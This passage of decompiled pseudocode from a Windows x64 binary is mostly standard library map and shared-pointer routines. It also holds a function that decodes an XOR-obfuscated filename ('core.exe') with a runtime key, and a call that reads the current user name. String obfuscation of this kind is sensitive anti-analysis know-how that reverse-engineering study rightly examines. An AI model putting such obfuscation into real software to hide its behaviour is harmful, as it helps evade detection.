// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);

//----- (000000014000EF00) ----------------------------------------------------
_QWORD *__fastcall sub_14000EF00(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9BE0;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9BE0 & 1 )
  {
    v5 = byte_1400D9BDC;
  }
  else
  {
    v4 = 69069 * dword_1400D9BD4 + 1234567;
    v1 = dword_1400D9BE0 | 1;
    dword_1400D9BD4 = v4;
    dword_1400D9BE0 |= 1u;
    dword_1400D9BCC = HIWORD(dword_1400D9BCC) + 36969 * (unsigned __int16)dword_1400D9BCC;
    LOBYTE(v4) = (BYTE2(dword_1400D9BD8) + 80 * dword_1400D9BD8) ^ v4;
    dword_1400D9BD8 = HIWORD(dword_1400D9BD8) + 18000 * (unsigned __int16)dword_1400D9BD8;
    v5 = (((unsigned int)dword_1400D9BD0 >> 13) ^ 32 * dword_1400D9BD0 ^ dword_1400D9BD0) + v4;
    dword_1400D9BD0 ^= ((unsigned int)dword_1400D9BD0 >> 13) ^ 32 * (dword_1400D9BD0 ^ (dword_1400D9BD0 << 12));
    byte_1400D9BDC = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9BE0 = v1 | 2;
    byte_1400D9BE8[0] = v5 ^ 0x63;
    byte_1400D9BE9 = (v5 - 1) ^ 0x6F;
    byte_1400D9BEA = (v5 - 2) ^ 0x72;
    byte_1400D9BEB = (v5 - 3) ^ 0x65;
    byte_1400D9BEC = (v5 - 4) ^ 0x2E;
    byte_1400D9BED = (v5 - 5) ^ 0x65;
    byte_1400D9BEE = (v5 - 6) ^ 0x78;
    byte_1400D9BEF = (v5 - 7) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 8ui64 )
  {
    sub_140004790(Src, 8ui64, 0i64);
    v5 = byte_1400D9BDC;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 8i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 8) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9BE8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 8 );
  return v3;
}
// 1400D9BCC: using guessed type int dword_1400D9BCC;
// 1400D9BD0: using guessed type int dword_1400D9BD0;
// 1400D9BD4: using guessed type int dword_1400D9BD4;
// 1400D9BD8: using guessed type int dword_1400D9BD8;
// 1400D9BDC: using guessed type char byte_1400D9BDC;
// 1400D9BE0: using guessed type int dword_1400D9BE0;
// 1400D9BE9: using guessed type char byte_1400D9BE9;
// 1400D9BEA: using guessed type char byte_1400D9BEA;
// 1400D9BEB: using guessed type char byte_1400D9BEB;
// 1400D9BEC: using guessed type char byte_1400D9BEC;
// 1400D9BED: using guessed type char byte_1400D9BED;
// 1400D9BEE: using guessed type char byte_1400D9BEE;
// 1400D9BEF: using guessed type char byte_1400D9BEF;

//----- (000000014000F0D0) ----------------------------------------------------
_QWORD *__fastcall sub_14000F0D0(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rcx

  v2 = a1;
  *a1 = &off_1400A3440;
  v3 = a1 + 1;
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  sub_140004DF0(v3, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v2;
}
// 1400A3440: using guessed type __int64 (__fastcall *off_1400A3440)(void *);

//----- (000000014000F120) ----------------------------------------------------
_QWORD *__fastcall sub_14000F120(void *a1, char a2)
{
  char v2; // di
  _QWORD *v3; // rbx

  v2 = a2;
  v3 = a1;
  if ( *((_QWORD *)a1 + 4) >= 0x10ui64 )
    operator delete(*((void **)a1 + 1));
  v3[4] = 15i64;
  v3[3] = 0i64;
  *((_BYTE *)v3 + 8) = 0;
  *v3 = &off_1400B0E50;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();

//----- (000000014000F180) ----------------------------------------------------
bool __fastcall sub_14000F180(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  bool v3; // bl
  bool result; // al
  void *Src; // [rsp+20h] [rbp-38h]
  unsigned __int64 v6; // [rsp+38h] [rbp-20h]

  v1 = a1;
  sub_14000B8D0();
  v2 = sub_140009FC0(&Src);
  v3 = (unsigned int)sub_14000B9E0((_QWORD *)(v1 + 8), v2) == 0;
  if ( v6 >= 0x10 )
    operator delete(Src);
  if ( v3 )
    result = sub_14000B0D0();
  else
    result = 1;
  return result;
}
// 14000B8D0: using guessed type __int64 sub_14000B8D0(void);

//----- (000000014000F270) ----------------------------------------------------
__int64 __fastcall sub_14000F270(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rsi
  __int64 *v3; // rax
  volatile signed __int32 *v4; // rbx
  __int64 v5; // rcx
  __int64 v6; // ST28_8
  volatile signed __int32 *v7; // rbx
  __int64 result; // rax
  __int64 v9; // [rsp+28h] [rbp-20h]
  __int64 v10; // [rsp+30h] [rbp-18h]
  volatile signed __int32 *v11; // [rsp+50h] [rbp+8h]

  v2 = a1;
  v9 = a2;
  v3 = (__int64 *)sub_14000F200(&v11);
  v10 = *v3;
  *v3 = 0i64;
  v4 = v11;
  if ( v11 )
  {
    if ( !_InterlockedDecrement(v11 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  sub_140008430();
  v5 = v9;
  v6 = *v2;
  *v2 = v5;
  v7 = (volatile signed __int32 *)v2[1];
  result = v10;
  v2[1] = v10;
  if ( v7 && !_InterlockedDecrement(v7 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
    if ( !_InterlockedDecrement(v7 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 16i64))(v7);
  }
  return result;
}
// 14000F200: using guessed type __int64 __fastcall sub_14000F200(_QWORD);

//----- (000000014000F350) ----------------------------------------------------
_QWORD *__fastcall sub_14000F350(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbp
  _QWORD *v3; // rbx
  __int64 v4; // rdi
  void *v5; // rax
  void *v7; // [rsp+38h] [rbp-40h]
  __int64 v8; // [rsp+48h] [rbp-30h]
  unsigned __int64 v9; // [rsp+50h] [rbp-28h]

  v2 = a2;
  v3 = a1;
  *a1 = off_1400A34C8;
  v4 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(v7) = 0;
  sub_140004DF0(&v7, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v5 = operator new(0x28ui64);
  if ( v5 )
    v4 = sub_14001E6B0(v5, v2);
  sub_14000F270(v3 + 1, v4);
  if ( v9 >= 0x10 )
    operator delete(v7);
  return v3;
}
// 14001E6B0: using guessed type __int64 __fastcall sub_14001E6B0(_QWORD, _QWORD);
// 1400A34C8: using guessed type __int64 (__fastcall *off_1400A34C8[7])();

//----- (000000014000F420) ----------------------------------------------------
bool __fastcall sub_14000F420(__int64 a1)
{
  return sub_14001E8C0(*(const CHAR **)(a1 + 8));
}

//----- (000000014000F430) ----------------------------------------------------
bool __fastcall sub_14000F430(__int64 a1)
{
  return sub_14001E900(*(const CHAR **)(a1 + 8));
}

//----- (000000014000F440) ----------------------------------------------------
void __fastcall sub_14000F440(__int64 a1)
{
  void *v1; // rbx

  v1 = *(void **)(a1 + 16);
  if ( v1 )
  {
    sub_14001E790(*(_QWORD *)(a1 + 16));
    operator delete(v1);
  }
}

//----- (000000014000F470) ----------------------------------------------------
bool __fastcall sub_14000F470(CHAR *a1, __int64 a2)
{
  __int64 pcbBuffer; // [rsp+38h] [rbp+10h]

  pcbBuffer = a2;
  return GetUserNameA(a1, (LPDWORD)&pcbBuffer) == 1;
}

//----- (000000014000F490) ----------------------------------------------------
_QWORD *__fastcall sub_14000F490(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rdi
  __int64 v4; // rcx

  a1[3] = 15i64;
  v2 = a2;
  a1[2] = 0i64;
  *(_BYTE *)a1 = 0;
  v3 = a1;
  if ( a2[3] >= 0x10ui64 )
  {
    *a1 = *a2;
    *a2 = 0i64;
  }
  else if ( a2[2] != -1i64 )
  {
    memmove(a1, a2, a2[2] + 1i64);
  }
  v3[2] = v2[2];
  v3[3] = v2[3];
  v2[2] = 0i64;
  v2[3] = 15i64;
  *(_BYTE *)v2 = 0;
  v3[4] = v2[4];
  v3[5] = 0i64;
  v4 = v2[5];
  v2[5] = 0i64;
  v3[5] = v4;
  v2[4] = 0i64;
  return v3;
}

//----- (000000014000F530) ----------------------------------------------------
_QWORD *__fastcall sub_14000F530(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (000000014000F5A0) ----------------------------------------------------
_QWORD *__fastcall sub_14000F5A0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (000000014000F610) ----------------------------------------------------
_QWORD *__fastcall sub_14000F610(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (000000014000F680) ----------------------------------------------------
_QWORD *__fastcall sub_14000F680(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (000000014000F6F0) ----------------------------------------------------
_QWORD *__fastcall sub_14000F6F0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (000000014000F760) ----------------------------------------------------
_QWORD *__fastcall sub_14000F760(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (000000014000F7D0) ----------------------------------------------------
_QWORD *__fastcall sub_14000F7D0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (000000014000F840) ----------------------------------------------------
_QWORD *__fastcall sub_14000F840(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (000000014000F8B0) ----------------------------------------------------
_QWORD *__fastcall sub_14000F8B0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A2D78;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A2D78: using guessed type __int64 (__fastcall *off_1400A2D78)();

//----- (000000014000F920) ----------------------------------------------------
_QWORD *__fastcall sub_14000F920(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rdi
  _QWORD *v3; // rbx

  v2 = a2;
  v3 = sub_140012FF0(a1);
  *((_WORD *)v3 + 12) = 0;
  if ( v3 != (_QWORD *)-32i64 )
    sub_14000F490(v3 + 4, v2);
  return v3;
}

//----- (000000014000F980) ----------------------------------------------------
_QWORD *__fastcall sub_14000F980(_QWORD *a1, _QWORD *a2, void *a3, _QWORD *a4, __int64 a5, _QWORD *a6)
{
  unsigned __int64 v6; // rax
  _QWORD *v7; // r10
  _QWORD *v8; // rbx
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int64 *v11; // rcx
  __int64 *v12; // r8
  __int64 *v13; // rdx
  __int64 v14; // rdx
  _QWORD *v15; // rdx
  _QWORD *v16; // rcx
  _QWORD *v17; // rdx
  _QWORD *v18; // r8
  __int64 v19; // rcx
  _QWORD *v20; // rcx
  __int64 v21; // rdx
  __int64 v22; // rcx
  _QWORD *v23; // rcx
  _QWORD *v24; // rcx
  __int64 v25; // rax
  __int64 v26; // rcx
  _QWORD *result; // rax

  v6 = a1[1];
  v7 = a1;
  v8 = a2;
  if ( v6 >= 0x333333333333332i64 )
  {
    v8 = a6;
    sub_1400115E0((__int64)(a6 + 4));
    operator delete(a6);
    std::_Xlength_error("map/set<T> too long");
    __debugbreak();
  }
  v7[1] = v6 + 1;
  a6[1] = a4;
  if ( a4 == (_QWORD *)*v7 )
  {
    *(_QWORD *)(*v7 + 8i64) = a6;
    *(_QWORD *)*v7 = a6;
    v9 = *v7;
LABEL_9:
    *(_QWORD *)(v9 + 16) = a6;
    goto LABEL_10;
  }
  if ( !(_BYTE)a3 )
  {
    a4[2] = a6;
    v9 = *v7;
    if ( a4 != *(_QWORD **)(*v7 + 16i64) )
      goto LABEL_10;
    goto LABEL_9;
  }
  *a4 = a6;
  if ( a4 == *(_QWORD **)*v7 )
    *(_QWORD *)*v7 = a6;
LABEL_10:
  v10 = a6;
  while ( !*(_BYTE *)(v10[1] + 24i64) )
  {
    v11 = (__int64 *)v10[1];
    v12 = (__int64 *)v11[1];
    v13 = (__int64 *)*v12;
    if ( v11 == (__int64 *)*v12 )
    {
      v14 = v12[2];
      if ( *(_BYTE *)(v14 + 24) )
      {
        if ( v10 == (_QWORD *)v11[2] )
        {
          v15 = (_QWORD *)v11[2];
          v10 = (_QWORD *)v10[1];
          v11[2] = *v15;
          if ( !*(_BYTE *)(*v15 + 25i64) )
            *(_QWORD *)(*v15 + 8i64) = v11;
          v15[1] = v11[1];
          if ( v11 == *(__int64 **)(*v7 + 8i64) )
          {
            *(_QWORD *)(*v7 + 8i64) = v15;
          }
          else
          {
            v16 = (_QWORD *)v11[1];
            if ( v10 == (_QWORD *)*v16 )
              *v16 = v15;
            else
              v16[2] = v15;
          }
          *v15 = v10;
          v10[1] = v15;
        }
        *(_BYTE *)(v10[1] + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(v10[1] + 8i64);
        v18 = (_QWORD *)*v17;
        *v17 = *(_QWORD *)(*v17 + 16i64);
        v19 = v18[2];
        if ( !*(_BYTE *)(v19 + 25) )
          *(_QWORD *)(v19 + 8) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v7 + 8i64) )
        {
          *(_QWORD *)(*v7 + 8i64) = v18;
          v18[2] = v17;
        }
        else
        {
          v20 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)v20[2] )
            v20[2] = v18;
          else
            *v20 = v18;
          v18[2] = v17;
        }
LABEL_50:
        v17[1] = v18;
        continue;
      }
      *((_BYTE *)v11 + 24) = 1;
      *(_BYTE *)(v14 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
      v10 = *(_QWORD **)(v10[1] + 8i64);
    }
    else
    {
      if ( *((_BYTE *)v13 + 24) )
      {
        if ( v10 == (_QWORD *)*v11 )
        {
          v21 = *v11;
          v10 = (_QWORD *)v10[1];
          *v11 = *(_QWORD *)(*v11 + 16);
          v22 = *(_QWORD *)(v21 + 16);
          if ( !*(_BYTE *)(v22 + 25) )
            *(_QWORD *)(v22 + 8) = v10;
          *(_QWORD *)(v21 + 8) = v10[1];
          if ( v10 == *(_QWORD **)(*v7 + 8i64) )
          {
            *(_QWORD *)(*v7 + 8i64) = v21;
          }
          else
          {
            v23 = (_QWORD *)v10[1];
            if ( v10 == (_QWORD *)v23[2] )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *(_QWORD *)(v21 + 16) = v10;
          v10[1] = v21;
        }
        *(_BYTE *)(v10[1] + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(v10[1] + 8i64);
        v18 = (_QWORD *)v17[2];
        v17[2] = *v18;
        if ( !*(_BYTE *)(*v18 + 25i64) )
          *(_QWORD *)(*v18 + 8i64) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v7 + 8i64) )
        {
          *(_QWORD *)(*v7 + 8i64) = v18;
        }
        else
        {
          v24 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)*v24 )
            *v24 = v18;
          else
            v24[2] = v18;
        }
        *v18 = v17;
        goto LABEL_50;
      }
      *((_BYTE *)v11 + 24) = 1;
      *((_BYTE *)v13 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
      v10 = *(_QWORD **)(v10[1] + 8i64);
    }
  }
  v25 = *v7;
  *v8 = a6;
  v26 = *(_QWORD *)(v25 + 8);
  result = v8;
  *(_BYTE *)(v26 + 24) = 1;
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014000FC30) ----------------------------------------------------
__int64 __usercall sub_14000FC30@<rax>(__int64 a1@<rdx>, _QWORD **a2@<rcx>, void *a3@<r8>, const void **a4@<r9>, void *a5)
{
  const void **v5; // r14
  char v6; // al
  __int64 v7; // r12
  _QWORD *v8; // rsi
  _QWORD *v9; // rcx
  __int64 *v10; // rbx
  _QWORD *v11; // r15
  bool v12; // di
  const void *v13; // r13
  _QWORD *v14; // rcx
  const void *v15; // rsi
  const void *v16; // rdx
  unsigned __int64 v17; // rdi
  signed int v18; // eax
  _QWORD *v19; // rdx
  const void *v20; // rsi
  const void *v21; // rdi
  const void *v22; // rcx
  signed int v23; // eax
  _QWORD *v24; // rbx
  __int64 j; // rax
  __int64 i; // rax
  void *v28; // rdi
  _QWORD *v29; // [rsp+30h] [rbp-38h]
  _QWORD **v30; // [rsp+70h] [rbp+8h]
  char v31; // [rsp+80h] [rbp+18h]

  v31 = (char)a3;
  v30 = a2;
  v5 = a4;
  v6 = (char)a3;
  v7 = a1;
  v8 = a2;
  v9 = *a2;
  v29 = v9;
  v10 = (__int64 *)v9[1];
  v11 = v9;
  v12 = 1;
  if ( !*((_BYTE *)v10 + 25) )
  {
    v13 = a4[3];
    do
    {
      v11 = v10;
      if ( v6 )
      {
        v14 = v10 + 4;
        v15 = v5[2];
        if ( (unsigned __int64)v13 < 0x10 )
          v16 = v5;
        else
          v16 = *v5;
        v17 = v10[6];
        if ( (unsigned __int64)v10[7] >= 0x10 )
          v14 = (_QWORD *)*v14;
        a3 = (void *)v5[2];
        if ( v17 < (unsigned __int64)v15 )
          a3 = (void *)v10[6];
        if ( a3 )
          v18 = memcmp(v14, v16, (size_t)a3);
        else
          v18 = 0;
        if ( !v18 )
        {
          if ( v17 >= (unsigned __int64)v15 )
            v18 = v17 != (_QWORD)v15;
          else
            v18 = -1;
        }
        v12 = v18 >= 0;
      }
      else
      {
        v19 = v10 + 4;
        v20 = (const void *)v10[6];
        if ( (unsigned __int64)v10[7] >= 0x10 )
          v19 = (_QWORD *)*v19;
        v21 = v5[2];
        if ( (unsigned __int64)v13 < 0x10 )
          v22 = v5;
        else
          v22 = *v5;
        a3 = (void *)v10[6];
        if ( v21 < v20 )
          a3 = (void *)v5[2];
        if ( a3 )
          v23 = memcmp(v22, v19, (size_t)a3);
        else
          v23 = 0;
        if ( !v23 )
        {
          if ( v21 >= v20 )
            v23 = v21 != v20;
          else
            v23 = -1;
        }
        v12 = v23 < 0;
      }
      if ( v12 )
        v10 = (__int64 *)*v10;
      else
        v10 = (__int64 *)v10[2];
      v6 = v31;
    }
    while ( !*((_BYTE *)v10 + 25) );
    v9 = v29;
    v8 = v30;
  }
  v24 = v11;
  if ( v12 )
  {
    if ( v11 == (_QWORD *)*v9 )
    {
      LOBYTE(a3) = 1;
      *(_QWORD *)v7 = *sub_14000F980(v8, &v30, a3, v11, (__int64)v5, a5);
      *(_BYTE *)(v7 + 8) = 1;
      return v7;
    }
    if ( *((_BYTE *)v11 + 25) )
    {
      v24 = (_QWORD *)v11[2];
    }
    else if ( *(_BYTE *)(*v11 + 25i64) )
    {
      for ( i = v11[1]; !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
      {
        if ( v24 != *(_QWORD **)i )
          break;
        v24 = (_QWORD *)i;
      }
      if ( !*((_BYTE *)v24 + 25) )
        v24 = (_QWORD *)i;
    }
    else
    {
      v24 = (_QWORD *)*v11;
      for ( j = *(_QWORD *)(*v11 + 16i64); !*(_BYTE *)(j + 25); j = *(_QWORD *)(j + 16) )
        v24 = (_QWORD *)j;
    }
  }
  if ( (signed int)sub_14000B9E0(v24 + 4, v5) >= 0 )
  {
    v28 = a5;
    sub_1400115E0((__int64)a5 + 32);
    operator delete(v28);
    *(_QWORD *)v7 = v24;
    *(_BYTE *)(v7 + 8) = 0;
  }
  else
  {
    *(_QWORD *)v7 = *sub_14000F980(v8, &v30, (void *)v12, v11, (__int64)v5, a5);
    *(_BYTE *)(v7 + 8) = 1;
  }
  return v7;
}

//----- (000000014000FEB0) ----------------------------------------------------
_QWORD *__fastcall sub_14000FEB0(_QWORD *a1, const struct std::exception *a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  sub_140010C60(a1, a2, 1);
  return v2;
}

//----- (0000000140010700) ----------------------------------------------------
_QWORD *__fastcall sub_140010700(_QWORD *a1, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v3; // rbx
  _QWORD *v4; // rdi
  __int64 v5; // rax

  v3 = a3;
  a1[3] = 15i64;
  a1[2] = 0i64;
  v4 = a1;
  *(_BYTE *)a1 = 0;
  sub_140004DF0(a1, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v4[4] = *v3;
  v5 = v3[1];
  v4[5] = v5;
  if ( v5 )
    _InterlockedIncrement((volatile signed __int32 *)(v5 + 8));
  return v4;
}

//----- (0000000140010760) ----------------------------------------------------
__int64 __fastcall sub_140010760(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rsi
  __int64 *v3; // rax
  volatile signed __int32 *v4; // rbx
  __int64 v5; // rcx
  __int64 v6; // ST28_8
  volatile signed __int32 *v7; // rbx
  __int64 result; // rax
  __int64 v9; // [rsp+28h] [rbp-20h]
  __int64 v10; // [rsp+30h] [rbp-18h]
  volatile signed __int32 *v11; // [rsp+50h] [rbp+8h]

  v2 = a1;
  v9 = a2;
  v3 = sub_140008610(&v11, a2);
  v10 = *v3;
  *v3 = 0i64;
  v4 = v11;
  if ( v11 )
  {
    if ( !_InterlockedDecrement(v11 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  sub_140008430();
  v5 = v9;
  v6 = *v2;
  *v2 = v5;
  v7 = (volatile signed __int32 *)v2[1];
  result = v10;
  v2[1] = v10;
  if ( v7 && !_InterlockedDecrement(v7 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
    if ( !_InterlockedDecrement(v7 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 16i64))(v7);
  }
  return result;
}

//----- (0000000140010840) ----------------------------------------------------
__int64 __fastcall sub_140010840(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rsi
  __int64 *v3; // rax
  volatile signed __int32 *v4; // rbx
  __int64 v5; // rcx
  __int64 v6; // ST28_8
  volatile signed __int32 *v7; // rbx
  __int64 result; // rax
  __int64 v9; // [rsp+28h] [rbp-20h]
  __int64 v10; // [rsp+30h] [rbp-18h]
  volatile signed __int32 *v11; // [rsp+50h] [rbp+8h]

  v2 = a1;
  v9 = a2;
  v3 = sub_14000F6F0(&v11, a2);
  v10 = *v3;
  *v3 = 0i64;
  v4 = v11;
  if ( v11 )
  {
    if ( !_InterlockedDecrement(v11 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  sub_140008430();
  v5 = v9;
  v6 = *v2;
  *v2 = v5;
  v7 = (volatile signed __int32 *)v2[1];
  result = v10;
  v2[1] = v10;
  if ( v7 && !_InterlockedDecrement(v7 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
    if ( !_InterlockedDecrement(v7 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 16i64))(v7);
  }
  return result;
}

//----- (0000000140010920) ----------------------------------------------------
__int64 __fastcall sub_140010920(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rsi
  __int64 *v3; // rax
  volatile signed __int32 *v4; // rbx
  __int64 v5; // rcx
  __int64 v6; // ST28_8
  volatile signed __int32 *v7; // rbx
  __int64 result; // rax
  __int64 v9; // [rsp+28h] [rbp-20h]
  __int64 v10; // [rsp+30h] [rbp-18h]
  volatile signed __int32 *v11; // [rsp+50h] [rbp+8h]

  v2 = a1;
  v9 = a2;
  v3 = sub_14000F760(&v11, a2);
  v10 = *v3;
  *v3 = 0i64;
  v4 = v11;
  if ( v11 )
  {
    if ( !_InterlockedDecrement(v11 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  sub_140008430();
  v5 = v9;
  v6 = *v2;
  *v2 = v5;
  v7 = (volatile signed __int32 *)v2[1];
  result = v10;
  v2[1] = v10;
  if ( v7 && !_InterlockedDecrement(v7 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
